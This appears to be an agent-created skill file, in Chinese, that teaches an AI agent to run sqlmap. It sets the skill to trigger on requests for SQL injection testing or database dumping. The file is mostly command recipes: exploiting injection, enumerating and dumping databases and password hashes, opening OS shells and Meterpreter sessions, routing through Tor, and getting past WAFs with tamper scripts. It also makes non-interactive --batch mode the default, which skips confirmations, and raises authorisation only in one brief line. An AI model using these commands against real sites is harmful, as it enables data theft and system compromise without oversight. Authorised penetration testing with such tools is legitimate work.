---
name: sqlmap
description: >
  SQL 注入自动化检测与利用工具 sqlmap v1.10。支持全类型注入 (B/E/U/S/T/Q)， 覆盖
  MySQL/Oracle/PostgreSQL/MSSQL 等主流数据库。 当用户要求 SQL 注入测试、SQL 注入检测、注入漏洞验证、数据库枚举、
  脱库、--os-shell 时触发此 skill。
agent_created: true
---

# sqlmap — SQL 注入自动化工具

## 工具位置

```
C:\HACK\1漏洞扫描工具\sqlmap\sqlmap.py
```

Python: `C:\Users\84977\AppData\Local\Programs\Python\Python312\python.exe`
版本: v1.10

官网: https://sqlmap.org

## 核心使用原则 (必须遵守)

1. **自动化场景始终加 `--batch`**: 用户偏好，避免交互式确认阻塞流程。
2. **默认输出到当前目录**: sqlmap 自动生成 `~/.local/share/sqlmap/output/<hostname>/` 下的输出目录。
3. **谨慎使用高风险参数**: `--risk=3`、`--os-shell`、`--os-pwn` 等具有破坏性，需确认后使用。

## 执行方式

所有命令通过 PowerShell 调用 Python:

```powershell
& "C:\Users\84977\AppData\Local\Programs\Python\Python312\python.exe" "C:\HACK\1漏洞扫描工具\sqlmap\sqlmap.py" [options]
```

## 常用场景

### 场景 1: 快速检测 GET 参数注入

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --batch
```

### 场景 2: POST 请求注入

```powershell
python sqlmap.py -u "http://target.com/login.php" --data="user=admin&pass=123" --batch
```

### 场景 3: 带 Cookie 认证的注入

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=xxx" --batch
```

### 场景 4: 指定参数测试

```powershell
python sqlmap.py -u "http://target.com/page.php?a=1&b=2" -p "a" --batch
```

### 场景 5: 提高检测深度和风险

```powershell
# level 1-5 (默认1)，越大越深入
# risk 1-3 (默认1)，越大风险越高 (会UPDATE/DELETE等)
python sqlmap.py -u "http://target.com/page.php?id=1" --level=3 --risk=2 --batch
```

### 场景 6: 强制指定数据库类型

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --dbms=mysql --batch
```

### 场景 7: 指定注入技术

```powershell
# B: Boolean-based blind
# E: Error-based
# U: Union query
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries
python sqlmap.py -u "http://target.com/page.php?id=1" --technique=BEU --batch
```

### 场景 8: 获取数据库指纹

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --banner --current-user --current-db --batch
```

### 场景 9: 枚举数据库和表

```powershell
# 列出所有数据库
python sqlmap.py -u "http://target.com/page.php?id=1" --dbs --batch

# 列出指定库的所有表
python sqlmap.py -u "http://target.com/page.php?id=1" -D dbname --tables --batch

# 列出指定表的列
python sqlmap.py -u "http://target.com/page.php?id=1" -D dbname -T users --columns --batch

# 脱库
python sqlmap.py -u "http://target.com/page.php?id=1" -D dbname -T users --dump --batch
```

### 场景 10: 全部自动化一条龙 (谨慎)

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --batch -a
```

`-a` 等效于: `--banner --current-user --current-db --passwords --dbs --tables --columns --schema --dump-all`

### 场景 11: 从文件读取请求 (Burp 抓包)

```powershell
python sqlmap.py -r request.txt --batch
```

`request.txt` 是 Burp Suite 保存的 HTTP 请求文件。

### 场景 12: 使用代理 (配合 Burp 观察)

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
```

### 场景 13: 随机 User-Agent

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --random-agent --batch
```

### 场景 14: Tor 匿名网络

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --tor --check-tor --batch
```

### 场景 15: OS Shell (高风险)

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
```

⚠️ 仅在确认目标有堆叠注入且权限足够时使用，不加 `--batch` 以保留交互确认。

### 场景 16: 清除会话缓存

```powershell
python sqlmap.py -u "http://target.com/page.php?id=1" --flush-session --batch
```

### 场景 17: 新手向导

```powershell
python sqlmap.py --wizard
```

## 关键参数速记

| 参数 | 作用 | 常用值 |
|------|------|--------|
| `-u` | 目标 URL | `"http://target.com?id=1"` |
| `-r` | 从文件读取 HTTP 请求 | `request.txt` |
| `--data` | POST 数据 | `"user=admin&pass=123"` |
| `--cookie` | HTTP Cookie | `"PHPSESSID=xxx"` |
| `-p` | 指定测试参数 | `id`, `user` |
| `--dbms` | 强制数据库类型 | `mysql`, `mssql`, `oracle`, `postgresql` |
| `--level` | 测试深度 (1-5) | `1` (默认), `3` (深入) |
| `--risk` | 测试风险 (1-3) | `1` (默认), `2` (中), `3` (高) |
| `--technique` | 注入技术 | `BEUSTQ` (默认全部) |
| `--batch` | 非交互模式 | — (自动化必须) |
| `--random-agent` | 随机 User-Agent | — |
| `--proxy` | 代理 | `http://127.0.0.1:8080` |
| `--tor` | Tor 匿名 | — |
| `--flush-session` | 清除缓存 | — |
| `--threads` | 线程数 (1-10) | `1` (默认), `5` |
| `-a` | 全部信息 | — |
| `--banner` | 数据库 banner | — |
| `--current-user` | 当前用户 | — |
| `--current-db` | 当前数据库 | — |
| `--dbs` | 列出数据库 | — |
| `-D` | 指定数据库 | `dbname` |
| `--tables` | 列出表 | — |
| `-T` | 指定表 | `users` |
| `--columns` | 列出列 | — |
| `-C` | 指定列 | `id,username,password` |
| `--dump` | 导出数据 | — |
| `--dump-all` | 导出所有 | — |
| `--passwords` | 枚举密码哈希 | — |
| `--schema` | 枚举 schema | — |
| `--os-shell` | OS Shell | — (高风险) |
| `--os-pwn` | OOB Shell/Meterpreter | — (极高风险) |
| `--wizard` | 新手向导 | — |

## 注入技术说明

| 字母 | 技术 | 说明 |
|------|------|------|
| `B` | Boolean-based blind | 布尔盲注 |
| `E` | Error-based | 报错注入 |
| `U` | Union query | 联合查询 |
| `S` | Stacked queries | 堆叠查询 |
| `T` | Time-based blind | 时间盲注 |
| `Q` | Inline queries | 内联查询 |

默认 `BEUSTQ` 全部启用。

## 输出位置

sqlmap 结果默认存储在:
```
~/.local/share/sqlmap/output/<target_hostname>/
```

包含:
- `log` — 详细日志
- `target.txt` — 目标信息
- `session.sqlite` — 会话数据 (用于断点续扫)
- `dump/` — 脱库数据

## 注意事项

- `--batch` 会在所有交互处选默认值，适合自动化但可能跳过重要确认。
- `--risk=3` 包含 `OR` 条件注入，可能修改数据。
- `--level=5` 会测试 HTTP Headers (Referer/User-Agent 等)。
- 扫描前确认目标授权，sqlmap 的请求特征明显，容易被 WAF/IDS 检测。
- `--delay` 可设置请求间隔 (秒) 用于绕过速率限制。
- `--tamper` 可加载篡改脚本绕过 WAF，如 `--tamper=space2comment`。
